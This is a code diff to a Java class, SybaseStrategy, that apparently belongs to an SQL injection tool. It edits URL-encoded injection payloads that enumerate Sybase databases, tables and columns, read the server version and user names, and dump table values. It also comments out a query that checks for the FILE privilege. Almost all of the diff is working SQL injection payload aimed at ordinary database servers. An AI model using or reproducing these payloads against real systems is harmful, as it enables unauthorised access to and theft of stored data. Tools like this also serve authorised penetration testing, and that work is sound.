@@ -15,69 +15,69 @@ public class SybaseStrategy implements ISQLStrategy {
     @Override
     public String getSchemaInfos() {
         return 
-            "select+bintostr(convert(varbinary(16384)," +
+            "select+" +
                 "@@version%2B'{%}'%2Bdb_name()%2B'{%}'%2Buser_name()%2B'{%}'%2Bsuser_name()" +
-            "))%2B'i'r";
+            "%2B'%01%03%03%07'r";
     }
 
     @Override
     public String getSchemaList() {
         return 
-            "select+rr%2b(CASE+WHEN+c>=nb+then+'i'+END)%2b'i'r+from+(select+'hh'%2bbintostr(convert(varbinary(16384),t.name))%2b'jj30hh'rr,count(*)c+" +
+            "select+rr%2b'%01%03%03%07'r+from+(select+'%04'%2bt.name%2b'%050%04'rr+" +
             "from(select+distinct++name+from+master..sysdatabases)t,(select+distinct+name+from+master..sysdatabases)t1+" +
             "where+t.name>=t1.name+" +
-            "group+by+t.name{limit})a,(select+count(*)nb+from+master..sysdatabases)x";
+            "group+by+t.name{limit})a";
     }
 
     @Override
     public String getTableList(Database database) {
         return 
-            "select+rr%2b(CASE+WHEN+c>=nb+then+'i'+END)%2b'i'r+from+(select+'hh'%2bbintostr(convert(varbinary(16384),t.name))%2b'jj30hh'rr,count(*)c+" +
+            "select+rr%2b'%01%03%03%07'r+from+(select+'%04'%2bt.name%2b'%050%04'rr+" +
             "from(select+distinct+name+from+" + database + "..sysobjects+where+type='U')t,(select+distinct+name+from+" + database + "..sysobjects+where+type='U')t1+" +
             "where+t.name>=t1.name+" +
-            "group+by+t.name{limit})a,(select+count(*)nb+from+" + database + "..sysobjects+where+type='U')x";
+            "group+by+t.name{limit})a";
     }
 
     @Override
     public String getColumnList(Table table) {
         return 
-            "select+rr%2b(CASE+WHEN+c>=nb+then+'i'+END)%2b'i'r+from+(select+'hh'%2bbintostr(convert(varbinary(16384),t.name))%2b'jj30hh'rr,count(*)c+" +
+            "select+rr%2b'%01%03%03%07'r+from+(select+'%04'%2bt.name%2b'%050%04'rr+" +
             "from(select+distinct+c.name+from+" + table.getParent() + "..syscolumns+c+inner+join+" + table.getParent() + "..sysobjects+t+on+c.id=t.id+where+t.name='" + table + "')t,(select+distinct+c.name+from+" + table.getParent() + "..syscolumns+c+inner+join+" + table.getParent() + "..sysobjects+t+on+c.id=t.id+where+t.name='" + table + "')t1+" +
             "where+t.name>=t1.name+" +
-            "group+by+t.name{limit})a,(select+count(*)nb+from+" + table.getParent() + "..syscolumns+c+inner+join+" + table.getParent() + "..sysobjects+t+on+c.id=t.id+where+t.name='" + table + "')x";
+            "group+by+t.name{limit})a";
     }
 
     @Override
     public String getValues(String[] columns, Database database, Table table) {
         String formatListColumn = ToolsString.join(columns, "{%}");
         
-        formatListColumn = formatListColumn.replace("{%}", "%2b'')))%2bchar(127)%2brtrim(ltrim(convert(varchar,");
+        formatListColumn = formatListColumn.replace("{%}", "%2b'')))%2b'%7f'%2brtrim(ltrim(convert(varchar,");
         
         formatListColumn = "rtrim(ltrim(convert(varchar," + formatListColumn + "%2b'')))";
 
         return 
-            "select+rr%2b(CASE+WHEN+c>=nb+then+'i'+END)%2b'i'r+from+(select+'hh'%2bbintostr(convert(varbinary(16384),t.s))%2b'jj30hh'rr,count(*)c+" +
+            "select+rr%2b'%01%03%03%07'r+from+(select+'%04'%2bt.s%2b'%050%04'rr+" +
             "from(select+distinct+" + formatListColumn +"s+from+" + database + ".." + table + ")t,(select+distinct+" + formatListColumn +"s+from+" + database + ".." + table + ")t1+" +
             "where+t.s>=t1.s+" +
-            "group+by+t.s{limit})a,(select+count(distinct+" + formatListColumn +")nb+from+" + database + ".." + table + ")x";
+            "group+by+t.s{limit})a";
     }
 
     @Override
     public String getPrivilege() {
-        return 
-            "concat(" +
-                "(" +
-                    "select+" +
-                        "hex(" +
-                            "if(count(*)=1,0x" + ToolsString.strhex("true") + ",0x" + ToolsString.strhex("false") + ")" +
-                        ")" +
-                    "from+INFORMATION_SCHEMA.USER_PRIVILEGES+" +
-                    "where+" +
-                        "grantee=concat(0x27,replace(cast(current_user+as+char),0x40,0x274027),0x27)" +
-                        "and+PRIVILEGE_TYPE=0x46494c45" +
-                ")," +
-                "0x69" +
-            ")";
+        return "";
+//            "concat(" +
+//                "(" +
+//                    "select+" +
+//                        "hex(" +
+//                            "if(count(*)=1,0x" + ToolsString.strhex("true") + ",0x" + ToolsString.strhex("false") + ")" +
+//                        ")" +
+//                    "from+INFORMATION_SCHEMA.USER_PRIVILEGES+" +
+//                    "where+" +
+//                        "grantee=concat(0x27,replace(cast(current_user+as+char),0x40,0x274027),0x27)" +
+//                        "and+PRIVILEGE_TYPE=0x46494c45" +
+//                ")," +
+//                "0x69" +
+//            ")";
     }
 
     @Override
@@ -226,7 +226,7 @@ public class SybaseStrategy implements ISQLStrategy {
         return 
             MediatorModel.model().initialQuery.replaceAll(
                 "1337(" + ToolsString.join(indexes, "|") + ")7331",
-                "(select'SQLi'%2b$1,replicate('#',1024)%2b'iLQS')"
+                "(select'SQLi$1'%2breplicate('%23',1024)%2b'iLQS')"
             );
     }
 
